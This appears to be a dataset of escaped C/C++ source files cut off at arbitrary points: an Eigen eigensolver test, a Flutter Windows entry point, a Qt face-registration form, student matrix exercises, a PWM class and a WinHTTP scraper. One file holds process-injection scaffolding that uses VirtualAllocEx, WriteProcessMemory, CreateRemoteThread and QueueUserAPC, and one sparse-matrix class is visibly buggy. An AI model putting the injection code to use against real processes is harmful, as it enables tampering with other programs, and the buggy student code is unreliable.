VERIFY_IS_MUCH_SMALLER_THAN( std::abs(tmp.determinant()), Scalar(1) );\n    }\n    // check eigenvectors\n    typename GeneralizedEigenSolver<MatrixType>::EigenvectorsType D = eig.eigenvalues().asDiagonal();\n    typename GeneralizedEigenSolver<MatrixType>::EigenvectorsType V = eig.eigenvectors();\n    VERIFY_IS_APPROX(a*V, b*V*D);\n  }\n\n  // regression test for bug 1098\n  {\n    GeneralizedSelfAdjointEigenSolver<MatrixType> eig1(a.adjoint() * a,b.adjoint() * b);\n    eig1.compute(a.adjoint() * a,b.adjoint() * b);\n    GeneralizedEigenSolver<MatrixType> eig2(a.adjoint() * a,b.adjoint() * b);\n    eig2.compute(a.adjoint() * a,b.adjoint() * b);\n  }\n\n  // check without eigenvectors\n  {\n    GeneralizedEigenSolver<MatrixType> eig1(spdA, spdB, true);\n    GeneralizedEigenSolver<MatrixType> eig2(spdA, spdB, false);\n    VERIFY_IS_APPROX(eig1.eigenvalues(), eig2.eigenvalues());\n  }\n}\n\nEIGEN_DECLARE_TEST(eigensolver_generalized_real)\n{\n  for(int i = 0; i < g_repeat; i++) {\n    int s = 0;\n    CALL_SUBTEST_1( generalized_eigensolver_real(Matrix4f()) );\n    s = internal::random<int>(1,EIGEN_TEST_MAX_SIZE/4);\n    CALL_SUBTEST_2( generalized_eigensolver_real(MatrixXd(s,s)) );\n\n    // some trivial but implementation-wise special cases\n    CALL_SUBTEST_2( generalized_eigensolver_real(MatrixXd(1,1)) );\n    CALL_SUBTEST_2( generalized_eigensolver_real(MatrixXd(2,2)) );\n    CALL_SUBTEST_3( generalized_eigensolver_real(Matrix<double,1,1>()) );\n    CALL_SUBTEST_4( generalized_eigensolver_real(Matrix2d()) );\n    TEST_SET_BUT_UNUSED_VARIABLE(s)\n  }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <windows.h>\n#include \"RegularInjection.h\"\n#include <memory>\n#include <iostream>\n#include \"Common.h\"\n#include \"UndocumentedData.h\"\n#include <winternl.h>\n#include <tlhelp32.h>\n#include \"KernelAccess/KernelAccess.h\"\n\nclass IProcessAccess\n{\npublic:\n    virtual void ReadMemory(void* addr, SIZE_T len, std::vector<BYTE>& dataRead) = 0;\n\n    virtual void WriteMemory(void* addr, const std::vector<BYTE>& data, SIZE_T& bytesWritten) = 0;\n\n    /// <summary>\n    /// Allocate memory in target process's context\n    /// </summary>\n    /// <param name=\"addr\"></param>\n    /// <param name=\"len\"></param>\n    /// <param name=\"protect\">example PAGE_READWRITE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE</param>\n    /// <returns></returns>\n    virtual void* AllocateMemory(void* addr, SIZE_T len, DWORD protect) = 0;\n\n    /// <summary>\n    /// \n    /// </summary>\n    /// <param name=\"addr\">Address of start routine</param>\n    /// <param name=\"param\">Start routine's parameter</param>\n    /// <param name=\"flag\">Example: CREATE_SUSPENDED</param>\n    /// <param name=\"threadId\"></param>\n    /// <returns>Handle to the thread. return null if the handle is not created</returns>\n    virtual HANDLE CreateThread(void* addr, void* param, DWORD flag, DWORD& threadId) = 0;\n\n    virtual void SetProcessInstrumentCallback(void* target) = 0;\n\n    virtual DWORD GetProcessId() = 0;\n\n    virtual std::vector<DWORD> EnumThreads()\n    {\n        std::vector<DWORD> ret;\n        auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); // second parameter is IGNORED, all threads in the system are captured.\n        if (snapshot == INVALID_HANDLE_VALUE)\n        {\n            Common::ThrowException(\"CreateToolHelp32Snapshot() failed with last error: %d.\", GetLastError());\n        }\n        auto handleDeleter = [](HANDLE h) -> void {CloseHandle(h); };\n        std::unique_ptr<void, decltype(handleDeleter)> holder1(snapshot, handleDeleter);\n\n        THREADENTRY32 threadData = {};\n        threadData.dwSize = sizeof(threadData);\n        if (!Thread32First(snapshot, &threadData))\n        {\n            Common::ThrowException(\"Thread32First() failed with last error: %d.\", GetLastError());\n        }\n        if (threadData.th32OwnerProcessID == GetProcessId())\n        {\n            ret.push_back(threadData.th32ThreadID);\n        }\n        while (true)\n        {\n            threadData.dwSize = sizeof(threadData);\n            if (!Thread32Next(snapshot, &threadData))\n            {\n                break;\n            }\n            if (threadData.th32OwnerProcessID == GetProcessId())\n            {\n                ret.push_back(threadData.th32ThreadID);\n            }\n        }\n        return ret;\n    }\n\n    /// <summary>\n    /// Get target thread handle.\n    /// DONT MIX THIS WITH Windows's API OpenThread()\n    /// </summary>\n    /// <param name=\"threadId\"></param>\n    /// <param name=\"access\">example: THREAD_ALL_ACCESS</param>\n    /// <returns></returns>\n    virtual HANDLE OpenThread(DWORD threadId, DWORD access) = 0;\n\n    /// <summary>\n    /// DONT MIX THIS Windows's API!!\n    /// </summary>\n    /// <param name=\"pfnAPC\"></param>\n    /// <param name=\"hThread\"></param>\n    /// <param name=\"dwData\"></param>\n    virtual void QueueUserAPC(PAPCFUNC pfnAPC, DWORD tid, ULONG_PTR dwData) = 0;\n\n    /// <summary>\n    /// If the queued apc can be guaranteed to be executed, return true\n    /// </summary>\n    /// <returns></returns>\n    virtual bool IsAPCReliable() = 0;\n};\n\nclass HandleProcessAccess : public IProcessAccess\n{\npublic:\n    virtual void ReadMemory(void* addr, SIZE_T len, std::vector<BYTE>& dataRead) override\n    {\n        dataRead.clear();\n        SIZE_T bytesRead = 0;\n        std::unique_ptr<BYTE> buffer = std::make_unique<BYTE>(len);\n        if (!ReadProcessMemory(handle, addr, buffer.get(), len, &bytesRead))\n        {\n            Common::ThrowException(\"ReadProcessMemory() failed with %d.\", GetLastError());\n        }\n        dataRead.assign(buffer.get(), buffer.get() + bytesRead);\n    }\n\n    virtual void WriteMemory(void* addr, const std::vector<BYTE>& data, SIZE_T& bytesWritten) override\n    {\n        if (!WriteProcessMemory(handle, addr, &data[0], data.size(), &bytesWritten))\n        {\n            Common::ThrowException(\"WriteProcessMemory() failed with %d.\", GetLastError());\n        }\n    }\n\n    virtual void* AllocateMemory(void* addr, SIZE_T len, DWORD protect) override\n    {\n        auto ret = VirtualAllocEx(handle, addr, len, MEM_COMMIT | MEM_RESERVE, protect);\n        if (!ret)\n        {\n            Common::ThrowException(\"VirtualAllocEx() failed with %d.\", GetLastError());\n        }\n        return ret;\n    }\n\n    virtual HANDLE CreateThread(void* addr, void* param, DWORD flag, DWORD& threadId) override\n    {\n        auto ret = CreateRemoteThread(handle, 0, 0, (LPTHREAD_START_ROUTINE)addr, param, flag, &threadId);\n        if (!ret)\n        {\n            Common::ThrowException(\"CreateRemoteThread() failed with %d.\", GetLastError());\n        ",
    "#include \"registerwin.h\"\n#include \"ui_registerwin.h\"\n#include <QFileDialog>\n#include <qfaceobject.h>\n#include <QSqlTableModel>\n#include <QSqlRecord>\n#include <QMessageBox>\n#include <QRegularExpression>\nRegisterWin::RegisterWin(QWidget *parent) :\n    QWidget(parent),\n    ui(new Ui::RegisterWin)\n{\n    ui->setupUi(this);\n}\n\nRegisterWin::~RegisterWin()\n{\n    delete ui;\n}\n\nvoid RegisterWin::timerEvent(QTimerEvent *e)\n{\n    //\u83b7\u53d6\u6444\u50cf\u5934\u6570\u636e\u5e76\u4e14\u663e\u793a\u5728\u754c\u9762\u4e0a\n    if(cap.isOpened())\n    {\n        cap>>image;\n        if(image.data == nullptr)\n        {\n            return;\n        }\n    }\n\n    //Mat\u8f6cQImage\n    cv::Mat rgbImage;\n    cv::cvtColor(image,rgbImage,cv::COLOR_BGR2RGB); // \u786e\u4fdd\u56fe\u50cf\u6570\u636e\u662f\u8fde\u7eed\u7684\n\n    // \u786e\u4fddQImage\u7684\u6b65\u957f\u662f\u6b63\u786e\u7684\n    QImage qImg(rgbImage.data, rgbImage.cols,rgbImage.rows,rgbImage.step1(),QImage::Format_RGB888);\n\n    //\u5728Qt\u754c\u9762\u4e0a\u663e\u793a\n    QPixmap mmp = QPixmap::fromImage(qImg);\n    mmp = mmp.scaledToWidth(ui->headpicLb->width());\n    ui->headpicLb->setPixmap(mmp);\n}\n\nvoid RegisterWin::on_resetBt_clicked()\n{\n    // \u6e05\u7a7a\u6587\u672c\u7f16\u8f91\u6846\n    ui->nameEdit->clear();\n\n    // \u9009\u4e2d\u7d22\u5f15\u4e3a0\u7684\u9879\uff0c\u5373\u4e3a\u201c\u8bf7\u9009\u62e9\u201d\n    ui->sex_comboBox->setCurrentIndex(0);\n    ui->numberEdit->clear();\n    ui->school_comboBox->setCurrentIndex(0);\n    ui->dormitoryEdit->clear();\n    ui->phone_number_Edit->clear();\n    ui->picfileEdit->clear();\n\n    // \u6e05\u9664\u56fe\u7247\u663e\u793a\u533a\u57df\n    ui->headpicLb->clear();\n}\n\n\nvoid RegisterWin::on_addpicBt_clicked()\n{\n    // \u68c0\u67e5\u6444\u50cf\u5934\u662f\u5426\u5904\u4e8e\u6253\u5f00\u72b6\u6001\n    if(ui->videoswitchBt->text() == \"\u5173\u95ed\u6444\u50cf\u5934\")\n    {\n        // \u5173\u95ed\u6444\u50cf\u5934\u548c\u5b9a\u65f6\u5668\n        killTimer(timerid);//\u5173\u95ed\u5b9a\u65f6\u5668\u4e8b\u4ef6\n        timerid = -1; // \u91cd\u7f6etimerid\u4e3a\u65e0\u6548\u503c\n        ui->videoswitchBt->setText(\"\u6253\u5f00\u6444\u50cf\u5934\");\n        ui->headpicLb->clear();// \u6e05\u9664\u56fe\u7247\u663e\u793a\u63a7\u4ef6\n        //\u5173\u95ed\u6444\u50cf\u5934\n        cap.release();// \u91ca\u653e\u6444\u50cf\u5934\u5bf9\u8c61,\u91ca\u653e\u5bf9\u8c61\u5c31\u76f8\u5f53\u4e8e\u5173\u95ed\u4e86\n    }\n\n    //\u901a\u8fc7\u6587\u4ef6\u5bf9\u8bdd\u6846\u9009\u62e9\u56fe\u7247\u8def\u5f84\n    QString filepath = QFileDialog::getOpenFileName(this);//\u4fdd\u5b58\u8def\u5f84\n    if (!filepath.isEmpty())\n    {\n        ui->picfileEdit->setText(filepath);\n\n        // \u663e\u793a\u56fe\u7247\n        QPixmap mmp;\n        if (!mmp.load(filepath))\n        {\n            // \u56fe\u7247\u52a0\u8f7d\u5931\u8d25\uff0c\u663e\u793a\u9519\u8bef\u6d88\u606f\u6216\u8fdb\u884c\u5176\u4ed6\u9519\u8bef\u5904\u7406\n            QMessageBox::warning(this, tr(\"\u9519\u8bef\"), tr(\"\u65e0\u6cd5\u52a0\u8f7d\u56fe\u7247\u6587\u4ef6: %1\").arg(filepath));\n            return;\n        }\n        mmp = mmp.scaled(ui->headpicLb->size());\n        ui->headpicLb->setPixmap(mmp);\n    }\n}\n\nvoid RegisterWin::on_registerBt_clicked()\n{\n    // 1. \u8fdb\u884c\u6570\u636e\u9a8c\u8bc1\n    QString name = ui->nameEdit->text();\n    QString sex = ui->sex_comboBox->currentText(); // comboBox\u662f\u6027\u522b\u9009\u62e9\u5668\n    QString number = ui->numberEdit->text(); // \u5047\u8bbe\u662f\u5b66\u53f7\u6216\u7f16\u53f7\n    QString school = ui->school_comboBox->currentText();\n    QString dormitoryNumber = ui->dormitoryEdit->text();\n    QString phoneNumber = ui->phone_number_Edit->text();\n    QString path_of_pic = ui->picfileEdit->text();\n\n    // \u5148\u786e\u8ba4\u4fe1\u606f\u662f\u5426\u586b\u5199\u597d\u4e86\n    // \u68c0\u67e5\u6bcf\u4e2a\u5b57\u6bb5\u662f\u5426\u4e3a\u7a7a\n    if (name.isEmpty() || sex == \"\u8bf7\u9009\u62e9\" || number.isEmpty() || school == \"\u8bf7\u9009\u62e9\" || dormitoryNumber.isEmpty() || phoneNumber.isEmpty())\n    {\n        QMessageBox::warning(this, \"\u9519\u8bef\", \"\u4fe1\u606f\u4e0d\u5b8c\u6574\uff0c\u8bf7\u5148\u5b8c\u6210\u6240\u6709\u4fe1\u606f\u7684\u586b\u5199\");\n        return;\n    }\n    // \u68c0\u67e5\u662f\u5426\u5df2\u7ecf\u91c7\u96c6\u56fe\u7247\n    if(path_of_pic.isEmpty())\n    {\n        QMessageBox::warning(this, \"\u9519\u8bef\", \"\u8bf7\u5148\u5b8c\u6210\u56fe\u7247\u7684\u91c7\u96c6\");\n        return;\n    }\n\n    // \u68c0\u67e5\u4fe1\u606f\u662f\u5426\u586b\u5bf9\u4e86\n    // \u68c0\u67e5\u5b66\u53f7\u6709\u6548\u6027\n    if(number.size() != 12)\n    {\n        QMessageBox::warning(this, \"\u9519\u8bef\", \"\u8bf7\u8f93\u5165\u6709\u6548\u7684\u5b66\u53f7\");\n        return;\n    }\n    //\u68c0\u67e5\u5bbf\u820d\u53f7\u6709\u6548\u6027\n    //QRegularExpression regex(\"^C\\\\d+-\");      // \u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\\\\d \u8868\u793a\u6570\u5b57\uff0c+ \u8868\u793a\u4e00\u4e2a\u6216\u591a\u4e2a\n    QRegularExpression regex(\"^C\\\\d+-\\\\d{3}$\");\n    QRegularExpressionMatch match = regex.match(dormitoryNumber);\n    if(!(match.hasMatch() && match.capturedStart() == 0))\n    {\n        QMessageBox::warning(this, \"\u9519\u8bef\", \"\u8bf7\u8f93\u5165\u6709\u6548\u7684\u5bbf\u820d\u53f7\");\n        return;\n    }\n    //\u68c0\u67e5\u7535\u8bdd\u53f7\u7801\u6709\u6548\u6027\n    if(phoneNumber.size() != 11)\n    {\n        QMessageBox::warning(this, \"\u9519\u8bef\", \"\u8bf7\u8f93\u5165\u6709\u6548\u7684\u7535\u8bdd\u53f7\u7801\");\n        return;\n    }\n\n    //2\u3001 \u901a\u8fc7\u7167\u7247\uff0c\u7ed3\u5408FaceObject\u6a21\u5757\u5f97\u5230faceid\n    cv::Mat image = cv::imread(ui->picfileEdit->text().toUtf8().data());\n\n    // \u68c0\u67e5\u56fe\u7247\u662f\u5426\u6210\u529f\u52a0\u8f7d\n    if (image.empty())\n    {\n        QMessageBox::warning(this, \"\u9519\u8bef\", \"\u65e0\u6cd5\u52a0\u8f7d\u56fe\u7247\u6587\u4ef6\");\n        return;\n    }\n\n    // \u7ed9\u6536\u96c6\u7684\u4eba\u8138\u56fe\u7247\u767b\u8bb0\uff0c\u5b9a\u51fa\u4e00\u4e2aid\n    QFaceObject faceobj;\n    int faceID = faceobj.face_register(image);\n    qDebug()<<faceID;\n    // \u5982\u679c\u91c7\u96c6\u7684\u7167\u7247\u4e0d\u662f\u4eba\u8138\uff0c\u5c31\u5e94\u8be5\u91cd\u65b0\u91c7\u96c6\n    if(faceID < 0)\n    {\n        QMessageBox::warning(this, \"\u9519\u8bef\", \"\u672a\u8bc6\u522b\u5230\u4eba\u8138\uff0c\u8bf7\u91cd\u65b0\u91c7\u96c6\u56fe\u7247\");\n        return;\n    }\n\n    //\u628a\u5934\u50cf\u4fdd\u5b58\u5230\u4e00\u4e2a\u56fa\u5b9a\u8def\u5f84\u4e0b,\u628a\u6587\u4ef6\u540d\u6539\u4e3a\u59d3\u540d\n    QString new_headfilename = QString(\"./data/%1.jpg\").arg(QString(ui->nameEdit->text()));\n    qDebug()<<new_headfilename;\n\n    //\u63a5\u4e0b\u6765\u5bf9\u56fe\u7247\u6539\u540d\n    QFile file(ui->picfileEdit->text());\n    if (!file.exists())\n    {\n        qDebug() << \"\u56fe\u7247\u4e0d\u5b58\u5728:\" << ui->picfileEdit->text();\n        return;\n    }\n    // \u4f7f\u7528QDir\u6765\u91cd\u547d\u540d\u6587\u4ef6\n    QDir dir;\n    if (!dir.rename(ui->picfileEdit->text(), new_headfilename))\n    {\n        qDebug() << \"\u91cd\u547d\u540d\u5931\u8d25:\" << ui->picfileEdit->text() << \"to\" << new_headfilename;\n        return;\n    }\n\n    //3\u3001 \u628a\u4e2a\u4eba\u4fe1\u606f\u5b58\u50a8\u5230\u6570\u636e\u5e93\u8868employee\n    QSqlTableModel model;// QSqlTableModel \u662f Qt \u6846\u67b6\u4e2d\u7528\u4e8e\u8868\u793a\u6570\u636e\u5e93\u8868\u5185\u5bb9\u7684\u4e00\u4e2a\u6a21\u578b\u7c7b\u3002\n    model.setTable(\"student\");//\u7ed1\u5b9a\u4e00\u4e0bstudent\u8868\u683c\n    //\u8bbe\u7f6e\u8868\u540d\uff0c\u901a\u8fc7 setTable \u65b9\u6cd5\uff0c\u4f60\u53ef\u4ee5\u544a\u8bc9 QSqlTableModel \u4f60\u60f3\u8981\u4e0e\u54ea\u4e2a\u6570\u636e\u5e93\u8868\u8fdb\u884c\u4ea4\u4e92\u3002\n    //\u5c06 model \u7ed1\u5b9a\u5230\u540d\u4e3a \"employee\" \u7684\u6570\u636e\u5e93\u8868\uff0c\u63a5\u7740\u53ef\u4f7f\u7528 QSqlTableModel \u7684\u5404\u79cd\u65b9\u6cd5\u6765\u67e5\u8be2\u3001\u7f16\u8f91\u548c\u63d2\u5165\u8be5\u8868\u4e2d\u7684\u6570\u636e\u3002\n    QSqlRecord record = model.record();\n    ",
    "#include <stdio.h>\r\n\r\nvoid afficherMatrice(char matrice[5][5]);\r\nvoid afficherLignesPaires(char matrice[5][5]);\r\nvoid afficherElementsImpairs(char matrice[5][5]);\r\nvoid afficherDiagonales(char matrice[5][5]);\r\n\r\nint main() {\r\n    char matrice[5][5] = {\r\n        {'1', '2', '3', '4', '5'},\r\n        {'7', 'a', 'c', '8', 'd'},\r\n        {'c', '9', '4', 'z', '8'},\r\n        {'5', '6', 'p', 'n', '3'},\r\n        {'2', '9', 't', 'm', 'k'}\r\n    };\r\n\r\n    printf(\"la matrice :\\n\");\r\n    afficherMatrice(matrice);\r\n    \r\n    printf(\"\\nles lignes  un indice pair:\\n\");\r\n    afficherLignesPaires(matrice);\r\n    \r\n    printf(\"\\nles elements un indice impair de chaque ligne:\\n\");\r\n    afficherElementsImpairs(matrice);\r\n    \r\n    printf(\"\\nles diagonales :\\n\");\r\n    afficherDiagonales(matrice);\r\n\r\n    return 0;\r\n}\r\n\r\n\r\nvoid afficherMatrice(char matrice[5][5]) {\r\n    for (int i = 0; i < 5; i++) {\r\n        for (int j = 0; j < 5; j++) {\r\n            printf(\"%c \", matrice[i][j]);\r\n        }\r\n        printf(\"\\n\");\r\n    }\r\n}\r\n\r\nvoid afficherLignesPaires(char matrice[5][5]) {\r\n    for (int i = 0; i < 5; i += 2) {\r\n        for (int j = 0; j < 5; j++) {\r\n            printf(\"%c \", matrice[i][j]);\r\n        }\r\n        printf(\"\\n\");\r\n    }\r\n}\r\n\r\nvoid afficherElementsImpairs(char matrice[5][5]) {\r\n    for (int i = 0; i < 5; i++) {\r\n        for (int j = 1; j < 5; j += 2) {\r\n            printf(\"%c \", matrice[i][j]);\r\n        }\r\n        printf(\"\\n\");\r\n    }\r\n}\r\n\r\nvoid afficherDiagonales(char matrice[5][5]) {\r\n    printf(\"le diagonales: \");\r\n    for (int i = 0; i < 5; i++) {\r\n        printf(\"%c \", matrice[i][i]);\r\n    }\r\n    printf(\"\\nle diagonales: \");\r\n    for (int i = 0; i < 5; i++) {\r\n        printf(\"%c \", matrice[i][4 - i]);\r\n    }\r\n    printf(\"\\n\");\r\n}\r\n",
    "#include <iostream>\n#include <vector>\n#include <stdexcept>\n\n// Abstract base class for sparse matrices\nclass SparseMatrix {\npublic:\n    virtual int get_num_rows() const = 0;\n    virtual int get_num_cols() const = 0;\n    virtual int get_nnz() const = 0; //get number of nonzero elements\n    virtual double operator()(const unsigned int row, const unsigned int col) const = 0; // Const overload for read access\n    virtual double& operator()(const unsigned int row, const unsigned int col, const double value) = 0;      // Non-const overload for write access\n    virtual std::vector<double> operator*(const std::vector<double> &vec) const = 0;\n    virtual void print() const = 0;\n    virtual ~SparseMatrix() = default;\n};\n\n// Derived class for COO format\nclass SparseMatrixCOO : public SparseMatrix {\nprivate:\n    std::vector<double> values; // Non-zero values\n    std::vector<int> rows;      // Row indices for non-zero values\n    std::vector<int> cols;      // Column indices for non-zero values\n    int num_rows, num_cols;\n\npublic:\n    SparseMatrixCOO(const int rows, const int cols) : num_rows(rows), num_cols(cols) {} //COO class constructor\n\n    int get_num_rows() const override { return num_rows; }\n    int get_num_cols() const override { return num_cols; }\n    int get_nnz() const override { return values.size(); }\n\n    // Const overload for operator() to access matrix entries without modifying\n    double operator()(const unsigned int row, const unsigned int col) const override {\n        for (int i = 0; i < values.size(); ++i) {\n            if (rows[i] == row && cols[i] == col) {\n                return values[i];\n            }\n        }\n        throw std::out_of_range(\"Element not found in sparse matrix.\");\n        \n    }\n\n    // Non-const overload for operator() to modify matrix entries\n    double& operator()(const unsigned int row, const unsigned int col, const double value) override {\n        if(row > num_rows || col > num_cols ) {\n            throw std::out_of_range(\"Position out of range\");\n        }\n        // se esistono gli indici NON devo aggiungere\n\n        rows.push_back(row); // add element in the last position of the vector (method of vector class)\n        cols.push_back(col);\n        values.push_back(value);\n\n        for (int i = rows.size()-2; rows[i]<row; i--)\n        {\n            if(rows[i]>row){\n               rows[i+1]=rows[i];\n            }\n        }\n        \n    }\n\n    // Overloading operator* for matrix-vector multiplication\n    std::vector<double> operator*(const std::vector<double>& vec) const override {\n        if (vec.size() != num_cols) {\n            throw std::invalid_argument(\"Vector size does not match matrix dimensions.\");\n        }\n\n        std::vector<double> result(num_rows, 0.0);\n        for (size_t i = 0; i < values.size(); ++i) {\n            result[rows[i]] += values[i] * vec[cols[i]];\n        }\n        return result;\n    }\n\n    // Print matrix in readable format\n    void print() const override {\n        for (size_t i = 0; i < values.size(); ++i) {\n            std::cout << \"Row: \" << rows[i] << \", Col: \" << cols[i] << \", Value: \" << values[i] << std::endl;\n        }\n    }\n\n    // Additional functions for adding or setting values could go here\n};\n\n\n\n\n\n\n// Derived class for CSR format - similar structure to SparseMatrixCOO with different data handling\nclass SparseMatrixCSR: public SparseMatrix {    \nprivate:\n    std::vector<double> values;\n    std::vector<int> columns;\n    std::vector<int> row_idx;\n    int num_rows, num_cols;\n\n\npublic:\n    SparseMatrixCSR(int rows, int cols) : num_rows(rows), num_cols(cols), row_idx(rows + 1, 0) {}\n\n\n    // Implementations for all virtual functions following CSR logic\n    //in common with SparseMatrixCOO. Should we define them in the base class?\n    int get_num_cols() const override { return num_cols; }\n    int get_nnz() const override { return values.size(); }\n    //new getter for row_idx\n    int get_num_rows() const override { return num_rows; }\n    \n\n    // Const overload for operator() to access matrix entries without modifying\n    double operator()(const unsigned int row, const unsigned int col) const override { \n        \n        if(row >= num_rows || col >= num_cols ) {\n            throw std::out_of_range(\"Position out of range\");\n        }\n        //Bounds for non-zero elements in row \"row\"\n        unsigned int row_start = row_idx[row];\n        unsigned int row_end = row_idx[row+1];\n\n        //Iterate over non-zero elements in the row to find the column\n        for (size_t k = row_start; k < row_end; ++k) {\n            if (columns[k] == col) {\n                return values[k];// Columns \"col\"found, return value\n            }\n        }\n        return 0.0; //Returns 0 if the non-zero element cannot be found within the matrix limits \n    }\n\n\n    // Non-const overload for operator() to modify matrix entries\n    double& operator()(const unsigned int row, const unsigned int col) override {      //NON RICONOSCE IL METODO PERCHE' LO STESSO NELLA CLASSE ",
    "#include \"SoftPWM.h\"\n\nSoftPWM::SoftPWM(PinName _outpin, bool _positive) :\n        pulse(_outpin)  \n{\n    if (_positive) {\n        pulse = 0;\n    } else {\n        pulse = 1;\n    }\n\n    positive = _positive;\n    interval = 0.02;\n    width = 0;\n    start(); \n}\n\nfloat SoftPWM::read() {\n    if (width <= 0.0) return 0.0;\n    if (width > 1.0)  return 1.0;\n    return width / interval;    \n}\n\nvoid SoftPWM::write(float duty) {\n    width = interval * duty;\n    if (duty <= 0.0) width =  0.0;\n    if (duty > 1.0)  width =  interval;\n}\n\nvoid SoftPWM::start() {\n    _ticker.attach(callback(this, &SoftPWM::TickerInterrapt), interval);\n}\n\nvoid SoftPWM::stop() {\n    _ticker.detach();\n    if (positive) {\n        pulse = 0;\n    } else {\n        pulse = 1;\n    }\n    wait_us(width * 1000000);\n}\n\nvoid SoftPWM::period(float _period) {\n    interval = _period;\n    start();\n}\n\nvoid SoftPWM::period_ms(int _period) {\n    period((float)_period / 1000);\n    start();\n}\n\nvoid SoftPWM::period_us(int _period) {\n    period((float)_period / 1000000);\n    start();\n}\n\nvoid SoftPWM::pulsewidth(float _width) {\n    width = _width;\n    if (width < 0.0) width = 0.0;\n}\n\nvoid SoftPWM::pulsewidth_ms(int _width) {\n    pulsewidth((float)_width / 1000);\n}\n\nvoid SoftPWM::pulsewidth_us(int _width) {\n    pulsewidth((float)_width / 1000000);\n}\n\nvoid SoftPWM::TickerInterrapt() { \n    if (width <= 0) return;\n\n    _timeout.attach(callback(this, &SoftPWM::end), width);\n    \n    if (positive) {\n        pulse = 1;\n    } else {\n        pulse = 0;\n    }    \n}\n\nvoid SoftPWM::end() {\n    if (positive) {\n        pulse = 0;\n    } else {\n        pulse = 1;\n    }    \n}",
    "\ufeff#include \"WebscrapingLibrary.h\"\n\n#include <windows.h>\n#include <winhttp.h>\n#include <iostream>\n#include <string>\n#include <vector>\n#include <locale>\n#include <codecvt>\n\n\n\nnamespace WebscrapingLib\n{\n    // Fonction pour convertir std::string en std::wstring\n    std::wstring WebscrapingLib::Fonctions::string_to_large_string(\n        const std::string& str\n    ) {\n        std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> convertisseur;\n        return convertisseur.from_bytes(str);\n    }\n\n    // Fonction pour supprimer les balises HTML\n    std::string WebscrapingLib::Fonctions::remove_html_tags(\n        const std::string& html\n    ) {\n        std::string sortie;\n        bool dansBalise = false;\n\n        for (char c : html)\n        {\n            if (c == '<') {\n                dansBalise = true;\n            }\n            else if (c == '>') {\n                dansBalise = false;\n            }\n            else if (!dansBalise) {\n                sortie += c;\n            }\n        }\n\n        return sortie;\n    }\n\n\n    // Fonction pour recuperer tout le contenu HTML depuis une URL\n    std::string WebscrapingLib::Fonctions::get_all_html(\n        const std::string& entreeURL\n    ) {\n        system(\"cls\");\n        std::wstring url = string_to_large_string(entreeURL);\n        LPCWSTR chemin = L\"/\";\n        std::string resultat;  // Pour stocker le contenu HTML\n\n        HINTERNET hSession = WinHttpOpen(L\"WebScraper/1.0\",\n            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,\n            WINHTTP_NO_PROXY_NAME,\n            WINHTTP_NO_PROXY_BYPASS, 0);\n\n        if (hSession) {\n            HINTERNET hConnection = WinHttpConnect(hSession, url.c_str(), INTERNET_DEFAULT_HTTP_PORT, 0);\n\n            if (hConnection) {\n                HINTERNET hRequete = WinHttpOpenRequest(hConnection, L\"GET\", chemin, NULL,\n                    WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);\n\n                if (hRequete) {\n                    BOOL bResults = WinHttpSendRequest(hRequete, WINHTTP_NO_ADDITIONAL_HEADERS,\n                        0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);\n\n                    if (bResults) {\n                        bResults = WinHttpReceiveResponse(hRequete, NULL);\n                    }\n\n                    if (bResults) {\n                        DWORD dwSize = 0;\n                        DWORD dwDownloaded = 0;\n                        std::vector<char> buffer;\n\n                        do {\n                            if (!WinHttpQueryDataAvailable(hRequete, &dwSize)) {\n                                std::cerr << \"Erreur lors de la v\ufffdrification des donn\ufffdes disponibles.\\n\";\n                            }\n\n                            if (dwSize > 0) {\n                                buffer.resize(dwSize + 1, 0);  // Allouer le tampon\n                                if (WinHttpReadData(hRequete, buffer.data(), dwSize, &dwDownloaded)) {\n                                    buffer[dwDownloaded] = '\\0';\n                                    resultat.append(buffer.data());  // Ajouter les donn\ufffdes re\ufffdues au r\ufffdsultat\n                                }\n                            }\n                        } while (dwSize > 0);\n                    }\n\n                    WinHttpCloseHandle(hRequete);\n                }\n\n                WinHttpCloseHandle(hConnection);\n            }\n\n            WinHttpCloseHandle(hSession);\n        }\n        else {\n            std::cerr << \"Erreur lors de l'ouverture de la session WinHTTP.\\n\";\n        }\n\n        return resultat;  // Retourner le contenu HTML\n    }\n\n\n    // Fonction pour r\ufffdcup\ufffdrer le texte sans balises HTML depuis une URL\n    std::string WebscrapingLib::Fonctions::get_all_text(\n        const std::string& entreeURL\n    ) {\n        system(\"cls\");\n        std::wstring url = string_to_large_string(entreeURL);\n        LPCWSTR chemin = L\"/\";\n        std::string resultat;  // Pour stocker le contenu textuel\n\n        HINTERNET hSession = WinHttpOpen(L\"WebScraper/1.0\",\n            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,\n            WINHTTP_NO_PROXY_NAME,\n            WINHTTP_NO_PROXY_BYPASS, 0);\n\n        if (hSession) {\n            HINTERNET hConnection = WinHttpConnect(hSession, 